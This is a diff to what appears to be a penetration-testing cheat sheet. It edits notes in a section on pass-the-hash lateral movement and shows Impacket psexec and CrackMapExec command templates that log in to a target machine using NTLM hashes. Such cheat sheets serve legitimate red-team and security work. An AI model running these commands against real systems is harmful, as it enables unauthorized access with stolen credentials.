@@ -66,12 +66,13 @@ Find-PSRemotingLocalAdminAccess
 #### Impacket
 - Use the empty lm hash ```00000000000000000000000000000000```
 - https://github.com/ropnop/impacket_static_binaries/releases/tag/0.9.22.dev-binaries
+- Also works with Linux variants ofc
 ```
 .\psexec_windows.exe -hashes <LM HASH>:<NTLM HASH> <DOMAIN>/<USER>@<COMPUTERNAME>
 ```
 
 #### Crackmapexec
-- Required elevated privileges to execute commands
+- Requires elevated privileges to execute commands with the `-x` parameter
 ```
 cme smb <COMPUTERNAME> -d <DOMAIN> -u <USER> -H <NTLM HASH>
 cme winrm <COMPUTERNAME> -d <DOMAIN> -u <USER> -H <NTLM HASH>
